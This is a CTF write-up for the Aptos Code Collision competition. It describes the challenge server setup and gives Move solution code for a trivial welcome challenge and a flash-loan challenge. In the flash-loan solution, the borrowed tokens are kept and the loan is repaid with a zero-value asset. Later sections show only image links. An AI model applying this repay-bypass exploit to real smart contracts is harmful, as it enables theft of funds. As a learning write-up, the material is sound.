# Aptos Code Collision CTF Writeup by zeroc

I participated in the [Aptos Code Collision CTF](https://ctf.aptosfoundation.org/) and learned a lot as a beginner in aptos. Below are the detailed writeups for this game.

rank: 5

![](./images/rank.png)

## Basic

Figuring out the whole challenge framework of this game may help you solve the challenges more easily.

There will be a server listening on a specific port and you can interact with it by establishing tcp connection. In general, your final goal is to make the `is_solved` function in the challenge contract not abort, then the server will give you the flag.

The general interaction process is as follows:
* The server listens on a specific port and waits for the client to connect.
* Once the client connects, the server will prepare a local environment to emulate the execution of the challenge contract.
* The client needs to send the bytecode of solution contract to the server. The server will publish all the contracts and may call the `initialize` function of the challenge contract to initialize the environment.
* The server waits for a series of instructions in the form of `address::module::function` from the client. The server will call the corresponding function of the corresponding module in the corresponding address. When the `solve` function of the solution contract is called, the server will return the result to the client.

## Welcome

It's a checkin challenge, the `is_solved` function in challenge contract will return `true` if `challenge_status.is_solved` is `true`. And we can see that the `solve` function in challenge contract will set `challenge_status.is_solved` to `true`.

So we just need to call the `solve` function in the solution contract.

```move
module solution::exploit {
    use challenge::welcome;

    public entry fun solve(account: &signer) {
        welcome::solve(account);
    }
}
```

![](./images/1.png)

## Flash Loan

As the name of the challenge suggests, this challenge requires exploiting a vulnerability in the flash loan contract to solve it. So we first need to understand  all the functions in the challenge contract, especially the functions we can call directly.

* `initialize`: It will create a fungible asset named `JBZ` and mint 1337 tokens of the asset using the mint reference as the initial supply.
* `flash_loan`: Set the `challenge_status.loan` to `true` and return the `amount` of fungible asset.
* `repay`: Set the `challenge_status.loan` to `false` and deposit the `amount` of fungible asset back to the `challenger`.
* `is_solved`: if `challenge_status.loan` is `true` or the balance of `challenger` not equals to 0, then abort.

Our goal is to withdraw all the fungible assets and make `challenge_status.loan` to `false`. Cause the implementation of this contract is extremely simple, it hasn't any check for the FungibleAsset you pass to the `repay` function. So we can just use a fake FungibleAsset to repay the loan.

```move
module solution::exploit {
    use challenge::flash;
    use aptos_framework::primary_fungible_store;
    use aptos_framework::fungible_asset;

    public entry fun solve(account: &signer) {
        let fa = flash::flash_loan(account, 1337);
        let metadata = fungible_asset::asset_metadata(&fa);
        let zero = fungible_asset::zero(metadata);
        primary_fungible_store::deposit(@1338, fa);  
        flash::repay(account, zero);
    }
}
```

![](./images/2.png)

## U Can't Touch This



![](./images/3.png)

## super mario 32

![](./images/4.png)

## super mario 64

![](./images/5.png)

## Zero Knowledge Bug

![](./images/7.png)

## groth16

![](./images/6.png)

## sage

![](./images/8.png)

## Simple Swap

![](./images/9.png)